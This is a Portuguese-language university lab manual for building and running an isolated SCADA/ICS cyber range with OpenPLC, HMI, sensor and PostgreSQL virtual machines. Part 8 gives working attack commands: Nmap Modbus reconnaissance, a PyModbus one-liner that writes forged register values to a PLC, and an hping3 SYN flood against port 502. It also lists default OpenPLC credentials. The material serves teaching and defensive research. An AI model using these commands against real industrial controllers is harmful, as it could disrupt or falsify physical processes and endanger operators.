# LABORATÓRIO SCADA / ICS VIRTUALIZADO — CYBER RANGE OT/SCADA
## Manual Operacional Completo: Instalação, Comissionamento, Operação e Testes de Invasão
### Procedimentos Padronizados (SOP) — Laboratório UFG

> Este documento constitui o guia operacional unificado para reconstrução, operação, monitoramento e engajamento ofensivo do laboratório de cibersegurança industrial. Foi projetado para que futuros acadêmicos, professores e pesquisadores consigam instanciar e auditar este ambiente isolado com precisão.
>
> **Aviso Ético e Legal:** As ferramentas (Hping3, Nmap, PyModbus) e as técnicas descritas neste manual possuem alto potencial destrutivo se empregadas fora da sub-rede simulada (`192.168.100.x`). Este material destina-se **unicamente ao uso educacional isolado**.

---

# PARTE 1 — PROPÓSITO E ARQUITETURA

## 1.1 Propósito do laboratório

Este laboratório SCADA/ICS virtualizado foi montado para:

- estudar protocolos industriais;
- visualizar tráfego OT;
- validar leitura e escrita Modbus;
- simular supervisão;
- registrar eventos em banco;
- observar falhas controladas;
- testar reconhecimento, saturação e manipulação de processo;
- usar a Kali como estação central de análise e interação.

O laboratório não foi desenhado para uso produtivo. Ele é um espaço experimental, acadêmico e de demonstração.

## 1.2 Máquinas do ambiente

O laboratório é composto por seis nós virtuais:

| VM | IP (rede OT) | Função |
|---|---|---|
| **Kali Admin** | `192.168.100.10` | Administração, enumeração, captura e testes |
| **Linux Template** | — | Golden image / base limpa para clones |
| **PLC / OpenPLC** | `192.168.100.20` | Controle industrial simulado (Modbus) |
| **SCADA HMI** | `192.168.100.30` | Supervisão, visualização e IDS heurístico |
| **Sensor Node** | `192.168.100.40` | Simulação de sinais de campo |
| **Database Server** | `192.168.100.50` | Persistência, histórico e logs (PostgreSQL) |

## 1.3 Topologia de rede (Dual-Homed)

O conceito vital do laboratório é a separação entre dois domínios:

- **Rede de Gerenciamento (Interface 1 — NAT):** fornece internet às VMs durante o bootstrap. Faixa `10.0.2.0/24` com DHCP.
- **Rede Operacional OT (Interface 2 — Internal Network):** rede isolada `lab_net`, faixa `192.168.100.0/24`, sem acesso à internet. É o barramento industrial simulado.

A separação entre as duas redes é fundamental. A interface OT nunca deve ser a rota default.

---

# PARTE 2 — PREPARAÇÃO DA INFRAESTRUTURA

## 2.1 Configuração do hipervisor (VirtualBox)

### Rede de Gerenciamento (NAT Network)
1. No VirtualBox, acesse **Preferências → Redes → Rede NAT**.
2. Crie uma rede com o nome `Gerencia_NAT` e IPv4 `10.0.2.0/24`.
3. Habilite DHCP para fornecer internet às VMs.

### Rede OT (Internal Network)
1. Acesse **Ferramentas → Gerenciador de Rede de Hospedeiro**.
2. Crie um adaptador do tipo **Internal Network** com o nome `lab_net`.
3. Não ative DHCP — os IPs serão estáticos, gerenciados pelo script de setup.

### Configuração de cada VM
Para cada máquina virtual, nas configurações de rede:
- **Adaptador 1:** NAT Network (`Gerencia_NAT`).
- **Adaptador 2:** Internal Network (`lab_net`). Configure o *Promiscuous Mode* como "Allow All" para facilitar a captura no Kali.

## 2.2 Instalação base das VMs

- **Nós de automação** (PLC, HMI, Sensor, DB, Template): Ubuntu Server 22.04 LTS (headless, sem interface gráfica).
- **Nó ofensivo** (Kali Admin): ISO do Kali Linux.

---

# PARTE 3 — PROVISIONAMENTO AUTOMATIZADO (IaC)

## 3.1 Download e preparação do script master

Com as VMs em execução e internet disponível pela rede NAT, acesse cada máquina pelo console e prepare o bootstrapper:

```bash
sudo mkdir -p /opt/scada-lab
cd /opt/scada-lab
sudo chmod +x scada_lab_master_setup.sh
```

## 3.2 Executando o bootstrapper e atribuindo roles

Execute o script como administrador em cada VM:

```bash
sudo ./scada_lab_master_setup.sh
```

O menu interativo aparecerá:

```text
==================== SCADA LAB MASTER SETUP ====================
1) Kali Admin
2) Linux Template
3) PLC OpenPLC
4) SCADA HMI
5) Sensor Node
6) Database Server
================================================================
```

Escolha a role correspondente em cada VM:

- **Kali (opção 1):** crava o IP `192.168.100.10` na interface secundária.
- **PLC (opção 3):** fixa o IP `192.168.100.20`, instala dependências C++ e compila o OpenPLC.
- **HMI (opção 4):** define o IP `192.168.100.30`, instala `python3-pip`, `pymodbus` e `psycopg2`.
- **Sensor (opção 5):** configura o IP `192.168.100.40` como nó de telemetria.
- **DB (opção 6):** isola no IP `192.168.100.50`, configura PostgreSQL 14, ajusta `pg_hba.conf` para autenticação `scram-sha-256` na faixa `.100.0/24` e cria as credenciais `scada_lab` com o schema `scadalab`.

> **Checagem diagnóstica:** ao término do script em cada VM, execute `ip a` e confirme que a interface secundária recebeu o IP estático correto.

---

# PARTE 4 — ESTADOS ESPERADOS DE CADA VM

## Kali
- Interface de gerenciamento com IP válido da rede NAT.
- Interface OT com IP `192.168.100.10`.
- Rota default pela interface de gerenciamento (OT não deve ser rota padrão).
- Shared folder funcional em `/media/sf_shared_dir`.
- Scripts e aliases carregados.
- `tcpdump` / `tshark` disponíveis.

## Template
- Hostname e ferramentas básicas instaladas.
- Mantida limpa como base dos clones.
- Não usar como máquina de trabalho diário.

## PLC
- Runtime OpenPLC instalado e ativo.
- Porta `502/TCP` aberta e respondendo na rede OT.
- Programa ST compilado e em status "Running".

## HMI
- Serviço Python (`super_scada.py`) ativo.
- Conectividade com a PLC (`.20`) e com o DB (`.50`).
- Dashboard ANSI operacional com motor IDS heurístico.

## Sensor
- Script `sensor_sim.py` em execução.
- Valores variando e sendo injetados no PLC via Modbus.
- Logs locais gerados.

## DB
- PostgreSQL 14 ativo.
- Porta `5432/TCP` aberta e acessível pela rede OT.
- Schema `scadalab` e usuário `scada_lab` criados.

---

# PARTE 5 — COMISSIONAMENTO E INICIALIZAÇÃO DA PLANTA

A sequência de boot deve ser respeitada. Iniciar a HMI antes do PLC gera timeouts e sujeira nas telas.

## Ordem recomendada de inicialização

1. Ligar o host (Windows) e abrir o VirtualBox.
2. Verificar se os discos estão montados e a template está íntegra.
3. Ligar a **Kali** (estação de entrada).
4. Ligar a **PLC**.
5. Ligar a **HMI**.
6. Ligar o **Sensor**.
7. Ligar o **DB**.
8. Validar conectividade e serviços.
9. Iniciar captura ou teste.
10. Registrar evidências.
11. Encerrar, desligar as VMs e criar snapshots se necessário.

## Etapa A — Partida do PLC (OpenPLC no IP `.20`)

1. Confirme que a compilação do OpenPLC terminou com sucesso.
2. Acesse o painel web: `http://192.168.100.20:8080` (via browser do Kali ou com port-forwarding no host).
3. Credenciais padrão: `OpenPLC / OpenPLC` (ou `admin / admin`).
4. Em **Programs**, faça upload do código fonte `Reator_Petroquimico_Estavel_UFG.st`.
5. Aguarde a compilação pelo compilador *Matiec* (logs do `gcc` aparecerão na tela).
6. Em **Dashboard**, ative o *Hardware Layer* (ou mantenha em *Blank* para simulação pura).
7. Clique em **START PLC**. O status da CPU mudará para "Running". A porta `502/TCP` estará escutando.

## Etapa B — Inicialização do Sensor (IP `.40`)

1. No console do Sensor, certifique-se de que o script Python esteja presente.
2. Inicie o laço de simulação:
   ```bash
   python3 /opt/scada-lab/sensor_sim.py
   ```
3. O terminal exibirá confirmações `TX-SUCCESS`, injetando valores de temperatura e pressão (com ruído gaussiano) nos registradores do PLC.

## Etapa C — Ativação da HMI (IP `.30`)

1. No console da HMI, inicie o supervisor:
   ```bash
   python3 /opt/scada-lab/super_scada.py
   ```
2. O dashboard ANSI emergirá na tela com os valores do reator.
3. Se o DB (`.50`) estiver acessível, o SCADA exibirá `Sincronizado (ACID OK)`.

A planta estará em **Regime Permanente** quando os três serviços estiverem ativos e comunicando.

---

# PARTE 6 — VALIDAÇÃO ESSENCIAL ANTES DE QUALQUER TESTE

Antes de iniciar qualquer cenário de teste, verifique:

### Na Kali
- Conectividade de gerenciamento e interface OT ativas (`ip a`).
- `tcpdump` ou `tshark` disponíveis.
- Scripts de teste na shared folder.
- Aliases carregados.
- Espaço em disco suficiente para arquivos `.pcap`.

### Na PLC
- OpenPLC ativo e em status "Running".
- Porta 502 aberta (`ss -tulpn | grep 502`).
- Host respondendo ao ping da Kali.

### Na HMI
- Dashboard ativo e recebendo dados do PLC.
- Conexão com o DB confirmada.

### No DB
- PostgreSQL ativo (`systemctl status postgresql`).
- Porta 5432 acessível da rede OT.
- Schema e usuário corretos.

### No Sensor
- Script em execução.
- Valores variando (não fixos em zero).

---

# PARTE 7 — PREPARAÇÃO DE UM TESTE CONTROLADO

## 7.1 Criar uma baseline
Antes do teste:
- confirmar o estado saudável das VMs;
- anotar IPs e serviços ativos;
- registrar prints do estado normal;
- fazer snapshot das VMs relevantes.

## 7.2 Iniciar a captura
Na Kali, abra o sniffer na interface OT antes do teste:
```bash
sudo tcpdump -i eth1 -n -nn port 502 -w /opt/scada-lab/pcap/auditoria_modbus_ataque.pcap
```
Garanta que o nome do arquivo identifique o cenário.

## 7.3 Executar o cenário
Disparar o teste na Kali, mantendo registro do horário de início.

## 7.4 Observar e documentar o efeito
Verificar:
- mudanças na HMI;
- comportamento do PLC;
- impacto no DB;
- mensagens de erro;
- alteração no tráfego.

## 7.5 Encerrar e salvar evidências
Salvar: PCAP, prints, logs, observações e registro de tempo início/fim.

---

# PARTE 8 — ENGAJAMENTO OFENSIVO (RED TEAMING)

Os três vetores a seguir estão mapeados sob o **MITRE ATT&CK for ICS**. Todos os ataques devem ser executados a partir do Kali (`192.168.100.10`), exclusivamente na sub-rede simulada.

## 8.1 Vetor 1 — Reconhecimento de Perímetro (Confidencialidade)

**Objetivo:** Mapear hosts ativos, portas abertas e serviços expostos na rede OT sem ser detectado.

**Procedimento:**
```bash
nmap -sV -p 502 --script modbus-discover 192.168.100.20
```

**O que coletar:**
- IPs encontrados e portas abertas.
- Unit ID do CLP (frequentemente ID 1 ou 0xFF).
- Assinatura de firmware (OpenPLC Project).
- Confirmação de ausência de firewall DPI micro-segmentado.

**O que registrar:** IPs, portas, serviços, tempos de resposta e diferenças entre hosts.

---

## 8.2 Vetor 2 — Falsificação Modbus (Integridade / Data Spoofing)

**Objetivo:** Injetar valores falsos nos registradores do PLC, contornando o sensor real e forçando o IDS da HMI a disparar.

**Procedimento:**
```bash
python3 -c "
from pymodbus.client import ModbusTcpClient
cliente_ataque = ModbusTcpClient('192.168.100.20')
cliente_ataque.write_registers(0, [2600, 3800])
"
```

**Validação do impacto:**
1. Observe a HMI (`.30`): o valor natural (~62°C) colapsará para ~95°C forjados.
2. O motor IDS heurístico disparará o alerta:
   `🚨 [ALERTA MAX] IDS DISPAROU: PERTURBAÇÃO FÍSICA MATEMATICAMENTE IMPOSSÍVEL! Modbus Spoofing Detectado`
3. No DB (`.50`), valide o registro forense:
   ```bash
   psql -U scada_lab scadalab
   SELECT * FROM historico_sensores ORDER BY id DESC LIMIT 5;
   ```
   O evento estará categorizado como `ANOMALIA_CIBERNETICA_CRITICA`.

**O que registrar:** valor antes, valor depois, confirmação de escrita, pacotes capturados, resposta da HMI e registro no DB.

---

## 8.3 Vetor 3 — SYN Flood DoS (Disponibilidade)

**Objetivo:** Saturar a porta `502/TCP` do PLC, interrompendo a comunicação com a HMI e o Sensor.

**Procedimento:**
```bash
sudo hping3 --flood -V -S -p 502 192.168.100.20
```

**Validação do impacto:**
1. Em 5 a 12 segundos, a *backlog queue* da VM `.20` entupirá e começará a rejeitar conexões legítimas.
2. A HMI e o Sensor exibirão: `Time-Out`, `Connection Refused` e `CONDICIONAL DE BLACKOUT TOTAL DA INFRAESTRUTURA`.
3. O operador fica cego, mas o firmware OpenPLC mantém os intertravamentos de segurança (safe state) independentemente da rede.
4. Interrompa o ataque com `Ctrl+C` e observe a restauração automática da rede em segundos.

---

# PARTE 9 — MANUTENÇÃO, TROUBLESHOOTING E DEPURAÇÃO

## 9.1 Falhas de conectividade

**Se a internet cair:**
- não reiniciar tudo de imediato;
- verificar se a NAT ainda existe;
- conferir `ip a` e `ip route`;
- confirmar que a interface de gerenciamento não foi sobrescrita.

**Se a rede OT sumir:**
- verificar se a interface OT ficou sem IP;
- conferir se a rede interna do VirtualBox continua conectada;
- validar se `Cable Connected` está marcado nas configurações da VM.

## 9.2 OpenPLC não sobe

- verificar `systemctl status`;
- checar logs do serviço;
- confirmar que a compilação do runtime terminou;
- validar porta 502 com `ss -tulpn | grep 502`.

## 9.3 Shared folder falha

- confirmar Guest Additions instaladas;
- confirmar que o usuário está no grupo `vboxsf`;
- verificar o caminho `/media/sf_shared_dir`;
- testar montagem manual.

## 9.4 Erro PyModbus (`TypeError: Unexpected Keyword Argument`)

Evite argumentos nomeados. Use apenas posicionais:

```python
# ERRADO
client.write_registers(address=0, values=[v1], slave=1)

# CORRETO
client.write_registers(0, [v1, v2])
```

## 9.5 Limpeza do banco de dados

Se o banco superlotou após uso prolongado ou os IDs estão corrompendo a visualização:

```bash
sudo -u postgres psql -d scadalab
TRUNCATE TABLE historico_sensores RESTART IDENTITY;
```

Todos os registros serão removidos mantendo o schema intacto para novos testes.

---

# PARTE 10 — BOAS PRÁTICAS OPERACIONAIS

- não editar a template diretamente após a fase base;
- usar snapshots com nomes claros (veja estrutura abaixo);
- manter senhas organizadas e documentadas;
- documentar IPs e hostnames;
- evitar mudanças simultâneas em múltiplas VMs;
- salvar scripts sempre com terminação de linha LF;
- validar uma VM por vez;
- nunca confundir rede OT com rede de gerenciamento;
- revisar o estado do ambiente antes de cada sessão;
- não deixar a shared folder exposta nas VMs OT finais.

## Estrutura de snapshots recomendada

```
kali-ready
base-clean
plc-ready
hmi-ready
sensor-ready
db-ready
lab-clean-operational
```

Esses pontos permitem voltar rapidamente a um estado confiável, separar alterações de cada fase e evitar reinstalações desnecessárias.

---

# PARTE 11 — ENCERRAMENTO DA SESSÃO

Ao finalizar cada sessão:

1. Fechar os testes em andamento.
2. Parar capturas (`Ctrl+C` no tcpdump).
3. Salvar PCAPs na shared folder ou exportar por SFTP.
4. Anotar resultados e observações.
5. Desligar as VMs na ordem inversa (DB → Sensor → HMI → PLC → Kali).
6. Remover hardware externo com segurança (ejetar HD externo antes de desligar o host).
7. Registrar se houve novo snapshot ou alteração permanente no ambiente.

---

# PARTE 12 — CAPACIDADES DO LABORATÓRIO

Com as VMs configuradas e os serviços validados, o laboratório suporta:

- testes de segurança em ambiente OT isolado;
- captura e análise de tráfego industrial (Modbus/TCP);
- validação de comportamento de CLPs sob ataque;
- demonstrações acadêmicas e apresentações de TCC;
- comparação entre baseline saudável e cenário comprometido;
- reprodução controlada de falhas de integridade e disponibilidade;
- documentação técnica e produção de evidências forenses (PCAP, logs, DB).

---

*Este manual deve ser usado como referência operacional durante toda a vida útil do laboratório e atualizado sempre que houver mudanças relevantes na infraestrutura ou nos procedimentos de teste.*
